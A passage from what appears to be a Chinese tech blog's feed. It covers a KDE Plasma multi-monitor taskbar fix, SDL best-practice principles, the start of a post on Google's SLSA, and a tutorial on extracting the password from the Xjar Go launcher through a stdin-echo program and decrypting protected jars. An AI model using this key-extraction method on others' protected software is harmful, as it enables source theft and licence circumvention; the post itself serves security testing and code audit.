    <content type="html"><![CDATA[<p>plasma使用扩展屏幕无法加载任务栏bug</p><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>由于笔记本的屏幕过于垃圾,并且有点儿小,所以就把外接的显示器当作主屏幕,并在plasma的配置中将笔记本屏幕关闭,然后就会出现一个玄学的问题,每次开机进入桌面,任务栏消失了,也无法通过win键唤起Application Launcher,这就很尴尬,之前以为是plasma自身的bug导致的,网上也没找到相关方法,当时由于工作比较忙,也没有时间来捣鼓它.过去了很长时间…此处省略一万字,主要是比较懒,plasma更新了好几个版本,这个问题还是没有解决,个人感觉可能这个是自己配置的问题,所以周末看看,捣鼓一下,个人设备配置如下:</p><p><img src="/img/20210828-01.png" alt="20210828-01.png"></p><p>bug相关截图如下:</p><p>sddm加载桌面截图:<br><img src="/img/20210828-07.jpg" alt="20210828-07.jpg"></p><p>进入plasma,无法加载任务栏,可以使用快捷键.<br><img src="/img/20210828-02.jpg" alt="20210828-02.jpg"></p><p>使用截图工具,截取整个屏幕,仍然是一张桌面图片,无任务栏,和分辨率显示应该没问题<br><img src="/img/20210828-06.png" alt="20210828-06.png"></p><p>系统配置中已将笔记本屏幕关闭<br><img src="/img/20210828-04.png" alt="20210828-04.png"></p><h2 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h2><p>通过分析xorg日志信息,系统加载日志信息,sddm日志信息,均未发现有任何异常.每次启动,如果移除外接显示器,直接使用笔记本屏幕,plasma桌面加载正常.如果同时使用笔记本和外接显示器,两个屏幕都会加载sddm登录界面,在一个屏幕输入完用户名和密码进入plasma桌面,与此同时笔记本屏幕关闭,外界显示器显示主界面,但是无法显示任务栏,个人感觉可能是在加载桌面的过程中笔记本屏幕和外接显示器的配置出现了冲突,导致plasma无法正常加载任务栏.</p><h2 id="尝试解决"><a href="#尝试解决" class="headerlink" title="尝试解决"></a>尝试解决</h2><p>在sddm的启动脚本中,使用xrandr命令强制指定外接显示器的分辨率并关闭笔记本屏幕<br>首先使用xrander命令列举当前显示器信息</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">xrandr <span class="hljs-comment">--listmonitors</span><br></code></pre></td></tr></table></figure><p><img src="/img/20210828-03.png" alt="20210828-03.png"></p><p>在:&#x2F;usr&#x2F;share&#x2F;sddm&#x2F;scripts&#x2F;Xsetup脚本中新增以下内容</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">xrandr</span> <span class="hljs-literal">--</span><span class="hljs-comment">output *HDMI1</span> <span class="hljs-literal">--</span><span class="hljs-comment">mode 1920x1080</span><br><span class="hljs-comment">xrandr</span> <span class="hljs-literal">--</span><span class="hljs-comment">output eDP1</span> <span class="hljs-literal">--</span><span class="hljs-comment">off</span><br></code></pre></td></tr></table></figure><p>重新加载桌面,发现plasma加载正常<br><img src="/img/20210828-05.png" alt="20210828-05.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>到这里,我只能通过在sddm中禁用笔记本屏幕,目前只是规避了这个问题,具体原因尚未可知,哪位大佬如果清楚可以私聊讨论一下.</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://wiki.archlinux.org/title/KDE">https://wiki.archlinux.org/title/KDE</a>【archlinux wiki–plasma】</li><li><a href="https://wiki.archlinux.org/title/Xrandr">https://wiki.archlinux.org/title/Xrandr</a>【archlinux wiki–xrandr】</li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Plasma</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Xjar加密破解</title>
    <link href="/2021/07/16/2021-07-16-Xjar-Crack/"/>
    <url>/2021/07/16/2021-07-16-Xjar-Crack/</url>
    
    <content type="html"><![CDATA[<p>Xjar加密破解</p><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>研发人员在客户侧部署系统时，为了防止更多源代码信息泄露，通常会将源码打包成二进制包，其中参杂一些混淆和加密的操作，防止逆向分析，安全人员在做测试，或者从一些泄露出来的二进制包进行漏洞挖掘时，总会遇到这些拦路虎，博主在逆向分析某系统jar包时就发现可以自动获取class文件，但是class内数据均被加密，打开全是乱码，但是spring boot启动相关代码是可以通过反编译获取到，第一次遇到，挺奇怪的，通过分析包名发现了io.xjar，后经过检索，发现是知名jar包加密工具xjar的特征。既然查到了，就顺便分析一下。</p><p><img src="/img/20210716-01.png" alt="20210716-01.png"></p><h2 id="xjar介绍"><a href="#xjar介绍" class="headerlink" title="xjar介绍"></a>xjar介绍</h2><p>xjar安全加密运行工具, 同时支持的原生JAR。基于对JAR包内资源的加密以及拓展ClassLoader来构建的一套程序加密启动、动态解密运行的方案, 避免源码泄露以及反编译.</p><h3 id="功能特性"><a href="#功能特性" class="headerlink" title="功能特性"></a>功能特性</h3><ul><li>无代码侵入, 只需要把编译好的JAR包通过工具加密即可.</li><li>完全内存解密, 降低源码以及字节码泄露或反编译的风险.</li><li>支持所有JDK内置加解密算法.</li><li>可选择需要加解密的字节码或其他资源文件.</li><li>支持Maven插件, 加密更加便捷.</li><li>动态生成Go启动器, 保护密码不泄露.</li></ul><h2 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h2><h3 id="xjar加密分析"><a href="#xjar加密分析" class="headerlink" title="xjar加密分析"></a>xjar加密分析</h3><p>对于破解一些需要授权的系统，通常破解的思路是动态加载重写后的方法，或者直接替换 jar 或 class ，但是 xjar 使用一个用 go 写的加载器，并且原项目所有 class 均被加密了，并且还做了 md5 和 sha1 的校验，无法通过替换来绕过。<br>后续分析 xjar ,发现使用对称加密算法加密 class 字节码，每次使用 xjar 加密源码，都会自动生成相关 go 的源码，包括 jar 包 hash 和加密密码，用户需要自行编译启动器。每次系统启动前，运行启动器，将秘钥通过标准输入流传到 jvm 中，然后通过 jvm 的 classloader 动态解密字节码，所以是纯 jvm 内存的解密。</p><h3 id="破解思路"><a href="#破解思路" class="headerlink" title="破解思路"></a>破解思路</h3><p>通过获取加解密秘钥，自行构建启动器(启动器在xjar项目源码中已存在，每次只会自动添加加密密钥，文件hash等数据，可以自行构建，移除hash检测，然后重新编译加载项目即可，这样就绕过了hash检测，我可以直接通过替换class，达到破解。但是当我做完这一步，发现我是真的笨，xjar提供了解密的方法，通过解密jar包，后续操作不就是水到渠成，何至于我还停留在修改启动器上。</p><h3 id="破解步骤"><a href="#破解步骤" class="headerlink" title="破解步骤"></a>破解步骤</h3><p>通过分析启动器xjar.go，发现只检测参数中是否包含-jar参数，目的是获取jar的名称，然后通过获取到的参数，拼接命令行，启动java项目。</p><p><img src="/img/20210716-02.png" alt="20210716-02.png"></p><p>可以写一个简单的程序将xjar启动器传给jvm的数据使用标准输出流打印出来。以下提供了php和go的两种写法，请自行参考或根据实际情况自行构建。<br>go版本:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus">package <span class="hljs-selector-tag">main</span><br><br>import (<br><span class="hljs-string">&quot;bufio&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br>)<br><br>func <span class="hljs-selector-tag">main</span>() &#123;<br><span class="hljs-selector-tag">input</span> := bufio<span class="hljs-selector-class">.NewScanner</span>(os.Stdin) <span class="hljs-comment">//初始化一个扫表对象</span><br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">input</span><span class="hljs-selector-class">.Scan</span>() &#123;                  <span class="hljs-comment">//扫描输入内容</span><br><span class="hljs-selector-tag">line</span> := <span class="hljs-selector-tag">input</span><span class="hljs-selector-class">.Text</span>() <span class="hljs-comment">//把输入内容转换为字符串</span><br>fmt<span class="hljs-selector-class">.Println</span>(line)    <span class="hljs-comment">//输出到标准输出</span><br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出输入流命令行如下,我这里构建完成的程序名为xjarCrack，是在linux上构建运行的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./xjar ./xjarCrack java -jar xjarTest-1.0-SNAPSHOT.xjar<br></code></pre></td></tr></table></figure><p><img src="/img/20210716-03.png" alt="20210716-03.png"></p><p>第一行是加密算法，第二行是密码长度，第三行是iv长度，最优一行是密码。</p><p>我这里也提供一个php版本，原理相同，如果碰到，根据自己熟练的语言自行构建即可:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://stdin&#x27;</span>));<br></code></pre></td></tr></table></figure><p>输出输入流命令行如下,我这里将php文件命名为file.php：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">./xjar php <span class="hljs-built_in">file</span>.php java -jar xjarTest<span class="hljs-number">-1.0</span>-SNAPSHOT.xjar<br></code></pre></td></tr></table></figure><p>通过获取到的密码，自行构建java项目，调用xjar解密方法，解密jar包即可。核心代码如下：</p><p>spring-boot jar包解密</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// Spring-Boot Jar包解密</span><br><span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;io.xjar&quot;</span>;<br><span class="hljs-type">XKey</span> <span class="hljs-variable">xKey</span> <span class="hljs-operator">=</span> XKit.key(password);<br>XBoot.decrypt(<span class="hljs-string">&quot;/path/to/read/encrypted.jar&quot;</span>, <span class="hljs-string">&quot;/path/to/save/decrypted.jar&quot;</span>, xKey);<br></code></pre></td></tr></table></figure><p>jar包解密</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// Jar包解密</span><br><span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;io.xjar&quot;</span>;<br><span class="hljs-type">XKey</span> <span class="hljs-variable">xKey</span> <span class="hljs-operator">=</span> XKit.key(password);<br>XJar.decrypt(<span class="hljs-string">&quot;/path/to/read/encrypted.jar&quot;</span>, <span class="hljs-string">&quot;/path/to/save/decrypted.jar&quot;</span>, xKey);<br></code></pre></td></tr></table></figure><p>使用idea自动加载jar包，可以查看配置文件，伪代码相关信息。</p><p><img src="/img/20210716-04.png" alt="20210716-04.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本次破解能够成功，主要归根于作者将xjar的源码进行开源，否则博主也没这么方便就破解掉了，通过分析xjar源码，我也发现了xjar在加密jar包，对jar包无损加密上做的确实厉害，虽然 xjar 在安全性上没办法起到更大的保障，但在很多地方是值得学习，致敬每一位开源大佬。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://github.com/core-lib/xjar">https://github.com/core-lib/xjar</a>【xjar github】</li><li><a href="https://learnku.com/articles/56253">https://learnku.com/articles/56253</a>【记录一次破解xjar加密的经历】</li><li><a href="https://www.jianshu.com/p/614e1d5358b2">https://www.jianshu.com/p/614e1d5358b2</a>【XJar: Spring-Boot JAR 包加&#x2F;解密工具，避免源码泄露以及反编译】</li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Code Audit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SDL最佳实践原则</title>
    <link href="/2021/07/05/2021-07-05-SDL-Best-Practice-Principles/"/>
    <url>/2021/07/05/2021-07-05-SDL-Best-Practice-Principles/</url>
    
    <content type="html"><![CDATA[<p>SDL最佳实践原则</p><hr><p>SDL是一个方法论,只是一种手段，而不是目的，安全左移理念,目的是设计与交付更安全的软件,来保护公司及用户资产,同时降低安全的成本;如果盲目为了SDL而SDL,完全照搬微软SDL流程,结果必然是悲惨的,就算你能完全实现,那最直接的就是没业务了,公司全员搞安全了… 因地制宜,提升企业自身安全能力，只有适合自己的才是最好的,我们做SDL其实真正花时间去思考解决的就是找到合适的方法将SDL方法论在客户侧落地来达到企业的安全目标,其中的顺序我们要明确,通俗来说:有些弯路是必须要走的。以下是个人总结10点SDL最佳实践原则，仅供参考。<br><img src="/img/20210705-01.png" alt="20210705-01.png"></p><h3 id="1、自顶向下"><a href="#1、自顶向下" class="headerlink" title="1、自顶向下"></a>1、自顶向下</h3><p>企业要推行SDL，单靠传统的信息安全部门或几个网络安全人员是不行的，必须由公司领导层支持，自顶向下去推行。之所以必须是自顶向下推行，一个重要的原因就是SDL的实施并不是只有信息安全部门投入就可以了，SDL会与产品、研发、测试、运维等相关部门深度结合，需要相关部门的积极支持和全体参与。另外，安全对于大部分企业而言，能直接看到的是成本投入增加，而产出收益却是隐性的，并不会因为做了SDL就能看到产品的直接的收益。<br>因此，不管是对于研发部门还是其他部门，有SDL的需求，但是很难有主动实施SDL的动力。微软在推行SDL时，是由比尔盖茨亲自发邮件宣布微软内部进入紧急状态，新版停止开发，8500名工程师参加安全编码规范培训，员工从开发代码上转移到识别和修正漏洞，将安全性作为他们工作中最为重要的一项指标。此次中断让微软付出1亿美元代价。这标志着当时世界上最大的软件公司对其产品安全性的看法已经发生了改变。微软首先开始尝试用系统化的思想来避免产生有漏洞的产品，减少”攻击者”滥用它所创建的各种操作系统和工作的机会。为了执行可信赖计算，逐步引入形成了SDL（安全开发生命周期）；而华为则是由CEO担任全球网络安全委员会主任来推行实施。也就是说，如果没有高层领导至上而下的要求，安全部门推行SDL只会是一厢情愿。相信很多安全部门在推行SDL时，都会遇到研发团队不配合而导致无法推行或推行效果不理想的情况。<br>除了来自高层的支持，企业还要有相应的组织结构支撑，而合理的组织结构是保障SDL实施效果的基础。因为SDL在实施过程中会产生大量新的工作内容和新的工作流程，如果这部分工作内容与工作职责模糊不清，将直接影响SDL的执行效率和实施效果。</p><h3 id="2、与现有管理体系相契合"><a href="#2、与现有管理体系相契合" class="headerlink" title="2、与现有管理体系相契合"></a>2、与现有管理体系相契合</h3><p>不少企业实施SDL时，将SDL作为一个独立的流程来操作，这使得企业需要投入大量额外资源来支撑SDL整个流程的运转，并且实施的质量得不到保障。因此，SDL的实施效果往往达不到预期。<br>安全本质上是产品的一种质量属性。在质量管理领域，业界已有成熟的方法和流程，比如：ISO9001、CMM等级，这些都用来保障产品的质量。大部分企业都设置有质量部门，并设置有质量管理人员角色。但安全往往因为专业性强，缺乏成熟的管理方法和流程，再加上安全部门的存在，因此产品质量部门通常不关心产品的安全问题。在SDL落地的过程中，将安全工程活动标准化，并纳入产品的质量体系，是保障SDL实施效果的基础。举个例子来说，当产品的某项安全指标没有达到要求时，质量部门有权否决产品的上市发布或上线运营。<br>部分领导对SDL存在误解，认为SDL就是灵丹妙药，觉得立刻推行SDL就可以提升应用安全能力，部分安全人员对于SDL的理解停留在纸上谈兵阶段，完全照搬微软SDL体系在业务部门推广，恶化部门间关系。当前主流SDL思想均是采用工具+体系咨询的方式进行推进，在项目伊始，咨询人员根据企业现状调研结果来梳理企业当前管理体系和安全状况，基于企业现有软件研发体系、人员管理体系，结合当前企业状况、企业安全目标、安全人员能力、SDL相关经费等因素来为企业量身制定SDL管理流程，做到与现有管理体系相契合，降低部门间隔阂，提高SDL流程可落地性。</p><h3 id="3、SDL流程可视化、任务可度量"><a href="#3、SDL流程可视化、任务可度量" class="headerlink" title="3、SDL流程可视化、任务可度量"></a>3、SDL流程可视化、任务可度量</h3><p>对于企业的研发高层领导来说，最关注的还是SDL实施效果。如何让SDL实施效果可视化，是SDL实施过程中需要注意的重要问题。如果研发高层领导看不到SDL的实施效果，那就意味着可能失去研发高层领导对SDL实施的持续支持和资源投入，从而导致SDL实施失败。SDL实施的效果本身就是隐性的。微软在这个问题上也没法给出立竿见影的效果，但今天Windows操作系统的安全性要比在SDL实施前的WindowsXP好多了，尽管今天的Windows操作系统还是有很多安全漏洞，但安全性的增强并不是简单地从漏洞数量上进行对比，而是漏洞发现的难度、漏洞利用的难度和漏洞被利用的影响都比之前有了明显的改善。<br>因此，作为SDL实施人员，需要在实施SDL前给研发部门高层领导一个相对合理的预期：世界上没有100%的安全，不能保证SDL实施后就不会再有漏洞了；也不是实施了SDL后安全就可以高枕无忧了。但这也并不意味着就完全看不到效果。如何让SDL实施的效果可视化，比较好的做法是建立一套度量体系，通过度量的方法让SDL实施的效果可视化出来。度量体系本身也是一套复杂的工程，比如说业界的OWASP SAMM和BSIMM就是复杂的评估度量体系。实施人员可以选取一些比较直观且容易实施的工程活动，体现工程能力的成熟度提升，这个和软件成熟度CMM类似。另外，也要有结果性的数据，比如：可以对测试发现的安全问题进行分级，建立一个SDL实施前的基线，再看SDL实施后每一年的问题发展趋势，针对共性高频问题针对性的提出解决方案。</p><h3 id="4、安全目标及项目分类分级"><a href="#4、安全目标及项目分类分级" class="headerlink" title="4、安全目标及项目分类分级"></a>4、安全目标及项目分类分级</h3><p>完整的SDL流程包含众多的安全活动，不同单位根据自身情况实施其中部分安全活动，而同样的活动在不同企业的投入弹性空间也非常大，以威胁建模为例，有的产品可能只花半天时间，而有的产品可能需要花一个月甚至更长时间。在SDL实施的过程中遇到过很多类似问题：这个活动需不需要做？这个活动需要做到什么程度？这个活动需求投入多少人？对于这些问题，并没有统一的答案。因为不同的产品所处的环境不一样，面临的风险也不一样。但我们可以给出基本的判断原则。这些原则的基本出发点就是产品的安全目标是什么？安全目标说起来容易，但要说清楚，就不是一件容易的事了。很多专业的安全人员往往更多的考虑安全技术，而忽略了安全目标。技术应该是用来支撑目标的达成，所以当目标不清楚的情况下，很难判断一项技术的使用是否合理？这些技术是否足够？这就导致了很多企业当前的一个现象：安全的投入好像是一个无底洞，不知道什么时候才能做完。这显然不是企业领导者所要的结果。因此，在实施SDL的过程中，定义一个清晰的安全目标，量身定制契合的安全开发流程，根据项目、数据、用户的重要程度及系统的开放性等，自动对项目进行分类分级，依据分类分级结果匹配相应的SDL流程，才能使SDL的实施过程更加科学合理。</p><h3 id="5、安全能力组件化"><a href="#5、安全能力组件化" class="headerlink" title="5、安全能力组件化"></a>5、安全能力组件化</h3><p>代码漏洞对于软件来说几乎是不可避免的，据数据统计，代码量与漏洞成正比。即便最早提出和实施方法论的微软，也不能保证代码百分之百没有漏洞。<br>漏洞问题对产品来说是最直观的（可直接利用）,也是最头痛的（消灭不了）;代码漏洞也是ADSL需要重点解决的问题。目前多数也认识到这一问题，并选择使用代码扫描工具，例如SAST和DAST等，但这类工具存在致命的缺陷：误报和漏报。误报过多造成大量研发资源的浪费，而漏报过多又会使得工具的应用效果大打折扣。代码扫描工具的漏报和误报是必然存在的，SDL中也有如何降低漏洞和误报的实践，但这更多需要依赖于新型的安全检测工具去解决。<br>从SDL的整体视角上看，扫描工具只能发现部分已存在的代码漏洞，并不能减少代码漏洞的产生，属于“后端被动式”的解决思路。SDL更关注如何减少代码漏洞的产生，也就是如何从“前端”主动解决问题。一个比较好的实践就是将产品中的安全特性组件化，比如：密码算法模块、认证授权模块，这些模块都是重要的缓解措施实现，一旦出问题就导致缓解措施被绕过的漏洞。因此，将这些模块组件化，让不同的产品在这些领域都使用公共组件，而不用自己开发，自然也就不会引入漏洞；而这些公共的组件则由安全专业团队重点保障，安全人员可以通过SCA工具监测项目中组件使用的情况。在微软，为了避免参数校验问题导致和缓冲区溢出问题，由专业的安全团队重写了经常导致漏洞的函数(如：​memcpy、strcpy等)，并由一系列自身带有安全校验的函数来代替，这一措施使得产品在很大程度上解决了缓冲区溢出的问题（虽不能全部解决，但效果显而易见，且投入成本不高）。</p><h3 id="6、软件供应链安全管理"><a href="#6、软件供应链安全管理" class="headerlink" title="6、软件供应链安全管理"></a>6、软件供应链安全管理</h3><p>不论是传统的软件企业还是新型的互联网企业，在软件开发的过程中都免不了要使用第三方组件和服务。第三方组件既包含开源软件，也包含商业软件。而且随着软件越复杂，第三方软件的使用数量也越来越多。从安全的角度看，第三方软件也是一个重要的风险源（比如，最近的SolarWinds构建平台恶意代码注入事件）。第三方软件不仅是产品集成的组件，开发环境中所用到的工具也要作为第三方软件来对待（XcodeGhost事件大家应该都还记得）。<br>第三方软件与自主研发的软件不一样。SDL的方法和流程没法覆盖开源社区和第三方厂商。那么如何管理第三方软件的风险，也是SDL实施过程中面临的一个主要的问题。具体来说，有以下实践供大家参考：</p><ul><li>(1)企业要有清单列表或者平台记录哪些产品使用了哪些第三方软件。一旦某个第三方软件出现漏洞，可以通过清单列表迅速排查。</li><li>（2)企业要有清单列表记录禁用的第三方软件。对于那些安全问题比较多、风险较大的第三软件，应加入到这个禁用清单列表中禁止使用。</li><li>（3)对于使用较多且开源的第三方组件，建议进行代码扫描，对于发现的漏洞，提交开源社区，并促使开源社区修复。</li><li>（4)对于第三方软件的使用要有安全性指导（主要是规避一些因配置不当引入的安全问题）。</li><li>（5)慎用对安全问题处理态度消极的厂商所开发的第三方软件。</li><li>（6)由于无法确保第三方组件供应商的稳定性并且供应商拒绝提供源代码，可以采取源代码第三方托管机制</li></ul><h3 id="7、SDL服务化产品化"><a href="#7、SDL服务化产品化" class="headerlink" title="7、SDL服务化产品化"></a>7、SDL服务化产品化</h3><p>无论在普通开发、敏捷开发还是DevSecOps模式下，SDL落地的关键都离不开流程体系和高度自动化工具链的融合。根据OWASP SDL项目团队的实践积累，若有一个一体化的平台能准确、完整地记录、管理和追踪软件产品在SDL实施过程中的实际情况，实现软件产品开发信息在SDL流程中跨活动、跨角色流动，才能真正确保软件产品的安全需求和安全设计在开发、测试和部署运维过程中落地。而无论是需求阶段的需求库、开发与测试的安全测试工具、安全开发流程管控平台、还是其他安全工具，都将成为SDL工具链中的一环。<br>对于部分企业，由于其安全人员数量和能力有限，对于部分安全活动需要专业安全人员参与，可以将相关任务以外包的形式交由第三方安全厂商来实施，安全人员负责任务进度和质量把控。</p><h3 id="8、SDL工具链-DevSecOps"><a href="#8、SDL工具链-DevSecOps" class="headerlink" title="8、SDL工具链(DevSecOps)"></a>8、SDL工具链(DevSecOps)</h3><p>近年来，DevOps的开发模式已被广泛应用。DevOps的核心思想是将开发和运维一体化，开发能快速推出产品进行AB测试，通过数个版本的迭代，使产品变得成熟稳定，同时也使产品功能变得丰富。在DevOps开发模式下，传统的SDL流程在DevOps模式下显得过于厚重，那么就需要有适用于DevOps流程的SDL,这就是DevSecOps的由来。由于运维流程也一体化了，因此在传统SDL的安全成本模型也就发生了变化。举个例子来说，在传统SDL的测试过程中，我们要尽可能的发现所有的安全漏洞，因为产品一旦发布，漏洞的修复成本会很高；但在互联网企业自己开发、自己测试、自己运维的DevOps模式下，产品发布后，漏洞修复的成本并不一定增加很多。因为运维一体化后，漏洞一旦发现，响应的时间可控制在一个很短的时间内。但这并不是说DevOps之后开发过程中的安全活动就不需要做了，只是做的方式会有差异。这个差异主要来自于安全功能的服务化、工具自动化。<br>安全功能服务化本身符合SOA架构和微服务架构的演进方向。安全功能服务化后，就能将产品的一些安全风险转移到安全服务上。以IAM服务为例，采用成熟的IAM服务能在很大程度上降低产品在认证和授权方面的问题。AWS提供的移动应用账号服务可以让移动应用直接集成，而不用担心账号的安全问题；或是采用OAuth认证方式，采用安全性很强的Google、腾讯，字节等知名厂商的安全认证对接。这样自然就减少了产品研发过程中的安全投入，使SDL可以变得快起来。另一方面，采用工具实现自动化，也在很大程度上能减少SDL过程的投入。<br>另外一点就是当前SDL流程壁垒效应比较严重，在软件安全开发生命周期中，各个阶段的数据无法做到完全互通，工具检测的标准不一，各个厂商的产品无法进行数据拉通，只能做到单一规则检测，无法完全通过检测结果来自动化评估相关参与人员的工作效率和工作质量。举个例子：AST工具检测的漏洞无法自动化反推需求、设计或编码阶段相关任务的质量。这部分如果交由专业人员来分析，势必会引入新的工作量。</p><h3 id="9、持续优化"><a href="#9、持续优化" class="headerlink" title="9、持续优化"></a>9、持续优化</h3><p>SDL 的核心理念是将安全考虑集成在软件开发的每一个阶段：需求、设计、编码、测试和运维。从需求、设计到发布产品的每一个阶段每都增加了相应的安全活动，以减少软件中漏洞的数量并将安全缺陷降低到最小程度。SDL是一个持续优化的过程，在SDL初期，为企业定制的SDL流程或多或少会存在不合理的可能性，或者在技术的升级变革中需要引入其他安全活动，所以在SDL实施过程中安全人员需要保留持续优化的理念，对于不合理的流程或者指标，参考各方建议及时进行优化并公示。</p><h3 id="10、建立SDL人员培养体系"><a href="#10、建立SDL人员培养体系" class="headerlink" title="10、建立SDL人员培养体系"></a>10、建立SDL人员培养体系</h3><p>在SDL实施的过程中，安全不仅仅是安全专家的职责，更是实施企业所有人的责任。仅靠几个安全专家很难保证企业所有产品的安全质量，而信息安全部门或网络安全部门面对软件开发往往也力不从心。SDL虽然整体设计软件产品的安全开发生命周期，偏重于方法和流程，但人的因素同样至关重要。对于同样的方法、同样的流程和同样的工具，如果实施人员的安全开发思想意识和技术能力不同，其产生的实施效果差异也会非常大。比如：某公司的安全部门要求所有口令都在hash后再存储，而开发人员就将口令设计成hash之后的结果，让人看了哭笑不得。<br>如何让所有研发人员都了解并关注软件安全开发？建立一套合适的培训体系是较好的业界实践。这里的培训强调的是体系化的软件安全开发培训，而不是安全部门内部组织的信息安全知识培训或攻防渗透技术培训，因为对于不同的部门、不同的岗位、不同的人员，其安全的认知意识和技术能力也是不一样的。简单来说，建议将安全培训分成不同的等级，且不同等级面向不同类型的人员群体。比如：软件安全开发意识培训可以面向所有人、软件安全编码培训可只面向开发和测试人员，而网络攻击技术培训可只面向安全专业人员。另外，需要让所有研发人员宏观的理解SDL方法与流程，有助于让每个研发人员了解其与SDL流程中上、下游角色的互动关系，也有助于让每个研发人员理解每一个SDL的工作环节对整体产品安全的重要性。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://news.microsoft.com/2012/01/11/memo-from-bill-gates/">https://news.microsoft.com/2012/01/11/memo-from-bill-gates/</a>【Memo from Bill Gates】</li><li><a href="https://cloud.tencent.com/developer/article/1459352">https://cloud.tencent.com/developer/article/1459352</a>【微软的安全开发生命周期(SDL)】</li><li><a href="https://www.secrss.com/articles/12575">https://www.secrss.com/articles/12575</a>【从微软、Facebook、华为的网络安全备忘录说开去】</li><li><a href="http://blog.nsfocus.net/nsfocus-adsl/">http://blog.nsfocus.net/nsfocus-adsl/</a>【绿盟科技SDL实践】</li><li><a href="https://www.freebuf.com/articles/es/232252.html">https://www.freebuf.com/articles/es/232252.html</a>【漫谈SDL：开篇明义】</li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SDL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>谷歌SLSA供应链框架介绍</title>
    <link href="/2021/06/23/2021-06-24-introducing-google-slsa-end-to-end-framework/"/>
    <url>/2021/06/23/2021-06-24-introducing-google-slsa-end-to-end-framework/</url>
    
    <content type="html"><![CDATA[<p>谷歌SLSA供应链框架介绍</p><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>软件供应链攻击事件（对软件包进行未经授权的修改）在过去的两年中呈上升趋势，并且被证明是影响所有用户的常见且可靠的攻击方式。软件开发和供应链部署都是相当复杂的，从源代码到构建再到发布，在整个工作流程中会存在众多威胁。虽然确实存在针对某些特定漏洞的单点解决方案，但没有全面的端到端框架来定义如何减轻整个软件供应链中的威胁，并提供合理的安全保障方案。面对近几个月令人大开眼界的损失数十亿美元骇客攻击（如：SolarWinds、Codecov)，如果软件开发人员和用户采用类似供应链的安全框架，其中一些攻击可能会被阻止或变得利用起来更加困难。<br>谷歌提出的解决方案是软件开发的供应链级别（Supply chain Levels for Software Artifacts 简称 SLSA，发音为“salsa”），这是一个端到端框架，用于保证整个软件供应链中组件的完整性。它的灵感来自于谷歌内部的“ Borg二进制授权系统”，它已经在谷歌内部使用了8年多，并且强制托管谷歌所有生产工作负载。SLSA的目标是改善行业状况，尤其是开源软件安全状况，进而抵御最要紧的供应链完整性威胁。使用SLSA，用户方便根据他们目前使用软件的安全状况做出明智的选择。</p><h2 id="SLSA用途"><a href="#SLSA用途" class="headerlink" title="SLSA用途"></a>SLSA用途</h2><p>SLSA帮助防范常见的软件供应链攻击。下图展示了一个典型的软件供应链，包括可能发生在供应链各个环节的攻击示例。在过去的几年中，每种类型的攻击均发生过，不幸的是，随着时间的推移，软件供应链事件攻击仍在增加。<br><img src="/img/20210624-01.png" alt="20210624-01.png"></p><table><thead><tr><th>序号</th><th>威胁类型</th><th>威胁案例</th><th>SLSA防御</th></tr></thead><tbody><tr><td>A</td><td>将恶意代码提交到源存储库</td><td><a 